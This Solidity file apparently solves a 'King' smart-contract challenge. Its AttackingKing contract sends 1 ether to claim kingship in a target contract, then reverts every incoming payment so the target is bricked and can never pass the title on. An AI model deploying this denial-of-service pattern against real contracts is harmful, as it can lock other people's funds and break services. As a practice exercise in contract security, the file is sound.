// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address payable public immutable contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Claim kingship
        contractAddress.call{value: 1 ether}("");
    }

    receive() external payable {
        // Pettily brick the contract
        revert('In that moment he realized he f****d up');
    }
}
